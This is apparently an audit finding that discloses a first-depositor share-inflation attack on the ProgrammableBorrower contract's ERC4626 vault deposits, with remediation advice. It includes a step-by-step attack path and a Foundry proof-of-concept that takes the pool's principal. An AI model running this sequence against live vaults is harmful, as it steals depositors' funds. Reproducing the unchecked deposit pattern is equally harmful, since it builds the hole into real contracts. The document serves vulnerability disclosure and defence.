### Title
Unprotected ERC4626 deposit allows first-depositor inflation to steal programmable-borrower funds - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
`ProgrammableBorrower` accepts any ERC4626 vault configured by the owner and deposits all idle pool assets through `vault.deposit()` without validating that a nonzero or economically fair amount of vault shares was minted. If the selected vault is empty or nearly empty and does not implement inflation protection, any vault user can initialize it with a dust deposit, donate enough underlying to inflate the share price, and cause the borrower’s epoch-start deposit to mint zero or near-zero shares. The attacker can then redeem their initial shares for the pool’s deposited principal.

### Finding Description
`ProgrammableBorrower.initialize()` only checks that the configured vault uses the same underlying asset, then grants it unlimited allowance (`contracts/strategies/idle/ProgrammableBorrower.sol:108-134`). During `onStartEpoch()`, the adapter deposits its entire on-hand balance into the configured ERC4626 vault and records `startAssets` from the pre-deposit asset value, but it never checks the share amount returned by `vault.deposit()` (`ProgrammableBorrower.sol:214-222`).

The vulnerable path is:

1. The configured ERC4626 vault is empty or nearly empty.
2. Before the next epoch starts, an attacker deposits `1 wei` of underlying and receives `1` vault share.
3. The attacker directly transfers a donation `D` to the vault so `totalAssets` becomes `D + 1` while `totalSupply` remains `1`.
4. The honest manager calls `IdleCDOEpochVariant.startEpoch()`. The CDO transfers the pooled assets to `ProgrammableBorrower`, then `onStartEpoch()` deposits the amount `P` into the vault (`ProgrammableBorrower.sol:216`; `contracts/IdleCDOEpochVariant.sol:295-303`).
5. A floor-rounding ERC4626 mints `P / (D + 1)` shares. With `D >= P`, the result is zero shares.
6. `_depositToVault()` ignores the returned `0`, so no failure is detected (`ProgrammableBorrower.sol:378-384`).
7. The attacker redeems their single share and receives the vault’s entire balance, approximately `P + D + 1`, for a net profit of approximately `P`.
8. `epochStartVaultAssets` still records `P`, while `_currentVaultAssets()` is zero. `_vaultNetInterest()` reports a loss but `totalInterestDueNow()` floors negative PnL at zero (`ProgrammableBorrower.sol:337-345`, `330-333`). In minted-interest mode, `IdleCDOEpochVariant.stopEpoch()` does not pull principal unless the pool is closing (`IdleCDOEpochVariant.sol:373-380`), so the theft can remain hidden until pending withdrawals or pool closure reveal the missing backing.

This is the vault/deposit-manipulation analogue of the reported untrusted-configuration vulnerability: externally influenced vault share configuration controls execution of the programmable-borrower deposit path.

### Impact Explanation
An unprivileged ERC4626 vault user can steal the programmable borrower’s first epoch deposit. The loss is the full pool balance deposited into the susceptible vault, up to the programmable vault’s entire TVL.

The accounting does not restore solvency: CDO strategy tokens remain outstanding while the borrower adapter holds zero shares and no cash. Later withdrawal requests, a close-pool `stopEpoch(0, 1)`, or borrower settlement will either fail and enter default or leave recovery claims underfunded. This is direct theft followed by protocol insolvency, not merely a temporary ERC4626 liquidity shortage.

### Likelihood Explanation
Likelihood is conditional but credible. The deployment can select a newly deployed or thinly populated ERC4626 vault, and the attacker does not need any privileged role or borrower access. The only requirements are:

- The vault accepts public deposits.
- Its share minting floors without virtual assets, dead shares, or another inflation defense.
- Its `totalSupply / totalAssets` state lets the attacker force a severely rounded deposit.

For an empty susceptible vault, the attack cost is only one initial share plus a temporary donation that is returned when the attacker redeems. The programmable borrower mode is expressly designed to park idle funds in an external ERC4626 vault, so this is within the intended integration surface.

### Recommendation
Do not deposit into an ERC4626 vault that can be in an empty or attacker-controlled share-price state.

At minimum:

- Require the configured vault to use virtual assets/shares or another documented first-depositor defense.
- At vault initialization or replacement, verify minimum seed liquidity and require that trusted shares are permanently locked before public deposits can control the share price.
- Quote shares with `previewDeposit()` before depositing and revert when the quote or returned shares are zero or below an explicit minimum.
- Ideally perform an owner-controlled bootstrap deposit and burn/lock the resulting shares before routing pool funds.

A returned-share check alone is not sufficient if the chosen vault is already empty; `previewDeposit()` may return zero. The vault must either have inflation-resistant conversion or a safely initialized liquidity base.

### Proof of Concept
The following Foundry-style sequence reproduces the attack against an empty ERC4626 implementation that mints shares as `assets * totalSupply / totalAssets` without virtual-share protection:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "contracts/IdleCDOEpochVariant.sol";
import "contracts/strategies/idle/ProgrammableBorrower.sol";
import "contracts/interfaces/IERC4626.sol";
import "contracts/interfaces/IERC20Detailed.sol";

contract InflationAttack is Test {
    IdleCDOEpochVariant cdo;
    ProgrammableBorrower borrowerAdapter;
    IERC4626 vault;
    IERC20Detailed usdc;

    address attacker = makeAddr("attacker");
    uint256 poolDeposit = 1_000_000e6;

    function testFirstDepositorStealsEpochAssets() external {
        // Existing fixture deployment:
        // - KYC-passed LP deposits `poolDeposit` into AA.
        // - `borrowerAdapter` is configured as the CDO borrower.
        // - `cdo.setIsProgrammableBorrower(true)` and `setIsInterestMinted(true)` were run.
        // - `vault` is a newly deployed, empty ERC4626 vault using floor conversion.

        deal(address(usdc), attacker, poolDeposit + 2);

        vm.startPrank(attacker);
        usdc.approve(address(vault), type(uint256).max);

        // Initialize the empty ERC4626 vault with one share.
        vault.deposit(1, attacker);

        // Inflate its share price so the borrower deposit mints zero shares.
        usdc.transfer(address(vault), poolDeposit);
        vm.stopPrank();

        uint256 attackerBefore = usdc.balanceOf(attacker);

        // Honest manager starts the epoch. This sends CDO funds to ProgrammableBorrower
        // and ProgrammableBorrower deposits all on-hand assets into the inflated vault.
        vm.prank(manager);
        cdo.startEpoch();

        // Floor math: poolDeposit * 1 / (poolDeposit + 1) == 0.
        assertEq(vault.balanceOf(address(borrowerAdapter)), 0);

        // The attacker redeems the only share for the full vault balance:
        // initial deposit + donation + pool principal.
        vm.prank(attacker);
        uint256 redeemed = vault.redeem(1, attacker, attacker);

        assertEq(redeemed, poolDeposit + poolDeposit + 1);
        assertEq(usdc.balanceOf(attacker) - attackerBefore, poolDeposit + 1);
        assertEq(borrowerAdapter.vaultSharesBalance(), 0);
        assertEq(borrowerAdapter.totalUnderlying(), 0);
    }
}
```

The same exploit can mint one or more dust shares instead of zero; zero shares is simply the clearest case. The invariant violated is fair deposit accounting: `ProgrammableBorrower` transfers `P` assets to the vault but accepts zero claim shares while continuing to account for the position as epoch principal.